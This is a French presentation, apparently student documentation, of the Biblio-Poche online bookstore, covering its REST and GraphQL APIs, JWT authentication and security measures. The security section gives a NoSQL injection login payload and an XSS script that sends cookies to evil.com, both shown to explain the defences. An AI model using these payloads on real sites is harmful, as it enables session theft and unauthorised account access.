# PRESENTATION DU PROJET BIBLIO-POCHE

## Sommaire
1. [Introduction](#1-introduction)
2. [Architecture du Projet](#2-architecture-du-projet)
3. [API REST](#3-api-rest)
4. [Securite](#4-securite)
5. [API GraphQL](#5-api-graphql)
6. [Comparaison REST vs GraphQL](#6-comparaison-rest-vs-graphql)
7. [Technologies Utilisees](#7-technologies-utilisees)

---

# 1. INTRODUCTION

## Qu'est-ce que Biblio-Poche ?

Biblio-Poche est une **application web de librairie en ligne** permettant aux utilisateurs de :
- Parcourir un catalogue de livres
- Ajouter des livres au panier
- Passer des commandes
- Laisser des avis
- Gerer leur profil

L'application dispose egalement d'une **interface d'administration** pour gerer les livres, commandes, et utilisateurs.

## Architecture Generale

```
┌─────────────────┐         HTTP          ┌─────────────────┐         ┌──────────┐
│    FRONTEND     │ ◄──────────────────►  │     BACKEND     │ ◄─────► │ MongoDB  │
│     (React)     │    REST / GraphQL     │    (Express)    │         │   (BDD)  │
│   Port 3000     │                       │    Port 5000    │         │          │
└─────────────────┘                       └─────────────────┘         └──────────┘
```

---

# 2. ARCHITECTURE DU PROJET

## Structure des dossiers

```
biblio-poche/
│
├── backend/                      # Serveur API
│   ├── models/                   # Schemas de donnees (MongoDB)
│   │   ├── Book.js              # Modele Livre
│   │   ├── User.js              # Modele Utilisateur
│   │   ├── Order.js             # Modele Commande
│   │   └── Payment.js           # Modele Paiement
│   │
│   ├── routes/                   # Endpoints REST
│   │   ├── authRoutes.js        # /api/auth (login, register)
│   │   ├── bookRoutes.js        # /api/books (CRUD livres)
│   │   ├── orderRoutes.js       # /api/orders (commandes)
│   │   ├── userRoutes.js        # /api/users (profil)
│   │   ├── paymentRoutes.js     # /api/payments (paiements)
│   │   └── adminRoutes.js       # /api/admin (administration)
│   │
│   ├── middleware/               # Middlewares de securite
│   │   ├── auth.js              # Verification JWT
│   │   └── admin.js             # Verification role admin
│   │
│   ├── graphql/                  # API GraphQL
│   │   ├── schema.js            # Types et definitions
│   │   ├── resolvers.js         # Logique des requetes
│   │   └── index.js             # Configuration Apollo
│   │
│   └── server.js                 # Point d'entree
│
└── frontend/                     # Application React
    └── src/
        ├── pages/               # Pages de l'application
        └── components/          # Composants reutilisables
```

---

# 3. API REST

## 3.1 Qu'est-ce qu'une API REST ?

**REST** (Representational State Transfer) est un style d'architecture pour les APIs web.

### Principes fondamentaux :

| Principe | Description |
|----------|-------------|
| **Client-Serveur** | Separation entre l'interface (frontend) et les donnees (backend) |
| **Sans etat (Stateless)** | Chaque requete contient toutes les infos necessaires |
| **Ressources** | Les donnees sont exposees via des URLs (endpoints) |
| **Methodes HTTP** | GET, POST, PUT, DELETE pour les operations CRUD |

### Les methodes HTTP :

| Methode | Action | Exemple |
|---------|--------|---------|
| **GET** | Lire | Recuperer la liste des livres |
| **POST** | Creer | Ajouter un nouveau livre |
| **PUT** | Modifier | Mettre a jour un livre |
| **DELETE** | Supprimer | Supprimer un livre |

---

## 3.2 Endpoints de l'API REST

### AUTHENTIFICATION (/api/auth)

| Methode | Endpoint | Description | Authentification |
|---------|----------|-------------|------------------|
| POST | /api/auth/register | Inscription | Non |
| POST | /api/auth/login | Connexion | Non |

**Exemple - Inscription :**
```http
POST http://localhost:5000/api/auth/register
Content-Type: application/json

{
    "username": "jean",
    "email": "jean@example.com",
    "password": "MotDePasse123!"
}
```

**Reponse :**
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
        "id": "507f1f77bcf86cd799439011",
        "username": "jean",
        "email": "jean@example.com",
        "role": "user"
    }
}
```

---

### LIVRES (/api/books)

| Methode | Endpoint | Description | Authentification |
|---------|----------|-------------|------------------|
| GET | /api/books | Liste des livres | Non |
| GET | /api/books?category=Roman | Filtrer par categorie | Non |
| GET | /api/books/:id | Detail d'un livre | Non |
| POST | /api/books | Creer un livre | Non* |
| POST | /api/books/:id/reviews | Ajouter un avis | Oui |

**Exemple - Liste des livres :**
```http
GET http://localhost:5000/api/books
```

**Reponse :**
```json
[
    {
        "_id": "507f1f77bcf86cd799439011",
        "title": "Dune",
        "author": "Frank Herbert",
        "price": 25,
        "category": "Science-Fiction",
        "stock": 10,
        "rating": 4.5,
        "numReviews": 12
    },
    {
        "_id": "507f1f77bcf86cd799439012",
        "title": "Fondation",
        "author": "Isaac Asimov",
        "price": 22,
        "category": "Science-Fiction",
        "stock": 8
    }
]
```

---

### COMMANDES (/api/orders)

| Methode | Endpoint | Description | Authentification |
|---------|----------|-------------|------------------|
| POST | /api/orders/orders | Creer une commande | Oui |
| GET | /api/orders/myorders | Mes commandes | Oui |
| GET | /api/orders/:id | Detail commande | Oui |
| PUT | /api/orders/:id | Modifier adresse | Oui |
| PUT | /api/orders/:id/cancel | Annuler | Oui |

**Exemple - Creer une commande :**
```http
POST http://localhost:5000/api/orders/orders
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
    "orderItems": [
        {
            "product": "507f1f77bcf86cd799439011",
            "title": "Dune",
            "qty": 2,
            "price": 25,
            "image": "url_image"
        }
    ],
    "shippingAddress": {
        "address": "123 Rue de Paris",
        "city": "Paris",
        "postalCode": "75001",
        "country": "France"
    },
    "totalPrice": 50
}
```

---

### UTILISATEURS (/api/users)

| Methode | Endpoint | Description | Authentification |
|---------|----------|-------------|------------------|
| PUT | /api/users/profile | Modifier profil | Oui |
| DELETE | /api/users/profile | Supprimer compte | Oui |

---

### PAIEMENTS (/api/payments)

| Methode | Endpoint | Description | Authentification |
|---------|----------|-------------|------------------|
| POST | /api/payments | Creer un paiement | Oui |
| GET | /api/payments | Mes paiements | Oui |
| GET | /api/payments/stats/summary | Resume | Oui |
| POST | /api/payments/:id/refund | Remboursement | Oui |

---

### ADMINISTRATION (/api/admin)

| Methode | Endpoint | Description | Authentification |
|---------|----------|-------------|------------------|
| GET | /api/admin/stats | Statistiques | Admin |
| GET | /api/admin/books | Liste livres | Admin |
| POST | /api/admin/books | Creer livre | Admin |
| PUT | /api/admin/books/:id | Modifier livre | Admin |
| DELETE | /api/admin/books/:id | Supprimer livre | Admin |
| GET | /api/admin/orders | Toutes commandes | Admin |
| PUT | /api/admin/orders/:id | Modifier statut | Admin |
| GET | /api/admin/users | Liste utilisateurs | Admin |
| PUT | /api/admin/users/:id/role | Changer role | Admin |

---

## 3.3 Codes de reponse HTTP

| Code | Signification | Utilisation |
|------|---------------|-------------|
| **200** | OK | Requete reussie |
| **201** | Created | Ressource creee |
| **400** | Bad Request | Donnees invalides |
| **401** | Unauthorized | Non authentifie |
| **403** | Forbidden | Acces refuse (pas les droits) |
| **404** | Not Found | Ressource non trouvee |
| **500** | Server Error | Erreur serveur |

---

# 4. SECURITE

## 4.1 Authentification JWT (JSON Web Token)

### Comment ca fonctionne ?

```
┌──────────┐                              ┌──────────┐
│  CLIENT  │                              │  SERVEUR │
└────┬─────┘                              └────┬─────┘
     │                                         │
     │  1. POST /login {email, password}       │
     │ ───────────────────────────────────────►│
     │                                         │
     │  2. Verification en BDD                 │
     │                                         │
     │  3. Reponse: { token: "eyJ..." }        │
     │ ◄───────────────────────────────────────│
     │                                         │
     │  4. Stockage du token (localStorage)    │
     │                                         │
     │  5. GET /api/orders/myorders            │
     │     Header: Authorization: Bearer eyJ...│
     │ ───────────────────────────────────────►│
     │                                         │
     │  6. Verification du token               │
     │                                         │
     │  7. Reponse: [ commandes... ]           │
     │ ◄───────────────────────────────────────│
```

### Structure d'un token JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsInJvbGUiOiJ1c2VyIn0.signature
└─────────── HEADER ───────────┘└─────────── PAYLOAD ───────────┘└── SIGNATURE ──┘
```

| Partie | Contenu |
|--------|---------|
| **Header** | Algorithme (HS256) et type (JWT) |
| **Payload** | Donnees : id utilisateur, role, expiration |
| **Signature** | Verification d'integrite avec cle secrete |

### Code du middleware d'authentification

```javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');

function authMiddleware(req, res, next) {
    // 1. Recuperer le header Authorization
    const authHeader = req.headers.authorization;

    // 2. Verifier la presence du token
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ message: 'Token manquant' });
    }

    // 3. Extraire le token
    const token = authHeader.split(' ')[1];

    try {
        // 4. Verifier et decoder le token
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // 5. Ajouter l'utilisateur a la requete
        req.user = { id: decoded.id, role: decoded.role };

        next();
    } catch (err) {
        return res.status(401).json({ message: 'Token invalide' });
    }
}
```

### Tests de securite JWT

| Test | Resultat attendu |
|------|------------------|
| Requete sans token | 401 "Token manquant" |
| Token modifie | 401 "Token invalide" |
| Token expire | 401 "Token invalide" |
| Token valide | 200 OK |
| User sur route admin | 403 "Acces refuse" |

---

## 4.2 Protection contre les injections NoSQL

### L'attaque

```javascript
// Payload malveillant
{ "email": { "$gt": "" }, "password": "x" }

// Tenterait de matcher TOUS les utilisateurs
User.findOne({ email: { "$gt": "" } })
```

### La protection

1. **Mongoose Type Casting** : Convertit les objets en strings
2. **Bcrypt** : Meme si un user est trouve, le mot de passe ne match pas

```javascript
// Le mot de passe est TOUJOURS verifie avec bcrypt
const isMatch = await bcrypt.compare(password, user.password);
// bcrypt.compare("x", "$2a$10$hash...") = false
```

### Test

```http
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": { "$gt": "" },
    "password": "x"
}
```

**Resultat :** `400 Bad Request - "Identifiants invalides"`

---

## 4.3 Protection XSS (Cross-Site Scripting)

### L'attaque

```html
<!-- Un attaquant essaie d'injecter du JavaScript -->
<script>document.location='http://evil.com?cookie='+document.cookie</script>
```

### La protection

```javascript
const xss = require('xss');

// AVANT de stocker en base
const cleanTitle = xss(req.body.title);
// "<script>alert(1)</script>" devient "&lt;script&gt;alert(1)&lt;/script&gt;"
```

### Test

```http
POST http://localhost:5000/api/books
Content-Type: application/json

{
    "title": "<script>alert('XSS')</script>",
    "author": "Hacker",
    "price": 10,
    "category": "Test"
}
```

**Resultat :** Le titre est stocke comme `&lt;script&gt;alert('XSS')&lt;/script&gt;`

---

## 4.4 Autres protections

### Helmet (En-tetes HTTP securises)

```javascript
const helmet = require('helmet');
app.use(helmet());
```

| En-tete | Protection |
|---------|------------|
| X-Content-Type-Options | Empeche le MIME sniffing |
| X-Frame-Options | Protege contre le clickjacking |
| X-XSS-Protection | Filtre XSS du navigateur |

### Rate Limiting (Anti brute-force)

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 1000                   // 1000 requetes max
});

app.use(limiter);
```

### Hashage des mots de passe (Bcrypt)

```javascript
const bcrypt = require('bcryptjs');

// Hashage (inscription)
const salt = await bcrypt.genSalt(10);
const hash = await bcrypt.hash(password, salt);
// "MonMotDePasse" -> "$2a$10$xK8Dj3kL2mN5pQ7rS1tU3..."

// Verification (login)
const isMatch = await bcrypt.compare(password, hash);
```

---

# 5. API GRAPHQL

## 5.1 Qu'est-ce que GraphQL ?

GraphQL est un **langage de requete pour API** developpe par Facebook.
Il permet au client de demander **exactement les donnees dont il a besoin**.

### Endpoint unique

```
POST http://localhost:5000/graphql
```

---

## 5.2 Concepts fondamentaux

### Types (Schema)

Definition de la structure des donnees :

```graphql
type Book {
    id: ID!
    title: String!
    author: String!
    price: Float!
    category: String
    stock: Int
    reviews: [Review]
}

type User {
    id: ID!
    username: String!
    email: String!
    role: String!
}
```

### Query (Lecture)

Pour LIRE des donnees :

```graphql
type Query {
    books: [Book]
    book(id: ID!): Book
    me: User
    myOrders: [Order]
}
```

### Mutation (Ecriture)

Pour MODIFIER des donnees :

```graphql
type Mutation {
    login(email: String!, password: String!): AuthPayload
    createBook(input: BookInput!): Book
    updateBook(id: ID!, input: BookInput!): Book
    deleteBook(id: ID!): Boolean
}
```

---

## 5.3 Exemples de requetes GraphQL

### Recuperer tous les livres (seulement titre et prix)

```graphql
{
    books {
        title
        price
    }
}
```

**Reponse :**
```json
{
    "data": {
        "books": [
            { "title": "Dune", "price": 25 },
            { "title": "Fondation", "price": 22 }
        ]
    }
}
```

### Recuperer un livre avec ses avis

```graphql
{
    book(id: "507f1f77bcf86cd799439011") {
        title
        author
        price
        reviews {
            rating
            comment
            user {
                username
            }
        }
    }
}
```

### Filtrer par categorie

```graphql
{
    books(category: "Science-Fiction") {
        title
        author
        price
    }
}
```

### Connexion (Mutation)

```graphql
mutation {
    login(email: "test@test.com", password: "MonMotDePasse123!") {
        token
        user {
            id
            username
            role
        }
    }
}
```

### Creer un livre (Mutation - Admin)

```graphql
mutation {
    createBook(input: {
        title: "Nouveau Livre"
        author: "Auteur"
        price: 19.99
        category: "Roman"
        stock: 50
    }) {
        id
        title
        price
    }
}
```

### Ajouter un avis (Mutation - Authentifie)

```graphql
mutation {
    addReview(
        bookId: "507f1f77bcf86cd799439011"
        input: {
            rating: 5
            comment: "Excellent livre !"
        }
    ) {
        title
        rating
        numReviews
    }
}
```

---

## 5.4 Authentification en GraphQL

Pour les requetes authentifiees, ajouter le header :

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

### Exemple avec Postman

```
POST http://localhost:5000/graphql
Headers:
    Content-Type: application/json
    Authorization: Bearer <token>
Body:
{
    "query": "{ me { id username email role } }"
}
```

---

## 5.5 Resolvers

Les resolvers sont les **fonctions qui executent les requetes** :

```javascript
const resolvers = {
    Query: {
        // Recuperer tous les livres
        books: async (_, { category }) => {
            let filter = {};
            if (category) filter.category = category;
            return await Book.find(filter);
        },

        // Recuperer un livre par ID
        book: async (_, { id }) => {
            return await Book.findById(id);
        },

        // Utilisateur connecte
        me: async (_, __, context) => {
            if (!context.user) throw new Error('Non authentifie');
            return await User.findById(context.user.id);
        }
    },

    Mutation: {
        // Connexion
        login: async (_, { email, password }) => {
            const user = await User.findOne({ email });
            if (!user) throw new Error('Identifiants invalides');

            const isMatch = await user.comparePassword(password);
            if (!isMatch) throw new Error('Identifiants invalides');

            const token = jwt.sign(
                { id: user._id, role: user.role },
                process.env.JWT_SECRET,
                { expiresIn: '7d' }
            );

            return { token, user };
        }
    }
};
```

---

# 6. COMPARAISON REST vs GraphQL

## 6.1 Tableau comparatif

| Critere | REST | GraphQL |
|---------|------|---------|
| **Endpoints** | Multiples (/books, /users) | Un seul (/graphql) |
| **Donnees** | Fixes par endpoint | Choisies par le client |
| **Over-fetching** | Oui (recoit tout) | Non (champs specifiques) |
| **Under-fetching** | Oui (plusieurs requetes) | Non (une seule requete) |
| **Versioning** | /api/v1, /api/v2 | Pas necessaire |
| **Cache** | Facile (HTTP cache) | Plus complexe |
| **Apprentissage** | Simple | Plus complexe |
| **Documentation** | Swagger/OpenAPI | Auto-generee |

---

## 6.2 Exemple concret

### Scenario : Afficher un livre avec ses avis et l'auteur de chaque avis

**Avec REST (3 requetes) :**
```http
GET /api/books/123              → Livre
GET /api/books/123/reviews      → Avis
GET /api/users/456              → Auteur de l'avis
```

**Avec GraphQL (1 requete) :**
```graphql
{
    book(id: "123") {
        title
        price
        reviews {
            rating
            comment
            user {
                username
            }
        }
    }
}
```

---

## 6.3 Quand utiliser REST vs GraphQL ?

### Utiliser REST quand :
- Application simple avec peu de relations
- Besoin de cache HTTP
- Equipe moins experimentee

### Utiliser GraphQL quand :
- Donnees complexes avec relations
- Clients mobiles (economie de bande passante)
- Besoin de flexibilite dans les requetes

### Notre projet :
- **REST** : API principale, simple et efficace
- **GraphQL** : Alternative offrant plus de flexibilite

---

# 7. TECHNOLOGIES UTILISEES

## Backend

| Technologie | Role |
|-------------|------|
| **Node.js** | Runtime JavaScript serveur |
| **Express** | Framework web |
| **MongoDB** | Base de donnees NoSQL |
| **Mongoose** | ODM pour MongoDB |
| **JWT** | Authentification par token |
| **Bcrypt** | Hashage des mots de passe |
| **Apollo Server** | Serveur GraphQL |
| **Helmet** | Securite des en-tetes |
| **Rate Limit** | Protection brute-force |

## Frontend

| Technologie | Role |
|-------------|------|
| **React** | Framework UI |
| **React Router** | Navigation SPA |
| **Axios** | Requetes HTTP |
| **Leaflet** | Cartes interactives |
| **localStorage** | Stockage client |

---

# CONCLUSION

Le projet Biblio-Poche demontre l'implementation d'une API moderne avec :

1. **REST API** : Endpoints CRUD classiques, simples et efficaces
2. **GraphQL API** : Alternative flexible pour des requetes precises
3. **Securite robuste** : JWT, bcrypt, XSS protection, rate limiting
4. **Architecture propre** : Separation des responsabilites (MVC)

L'application permet aux utilisateurs de naviguer, commander et evaluer des livres, tout en offrant une interface d'administration complete.

---

## Annexes

- **OUTILS_ET_TECHNOLOGIES.md** : Detail des librairies
- **SECURITY_TESTS.md** : Guide des tests de securite
- **GRAPHQL_TESTS.md** : Tests GraphQL avec Postman
- **GUIDE_ATTAQUES_DETAILLE.md** : Mecanismes des attaques
- **explication.txt** : Description de chaque fichier
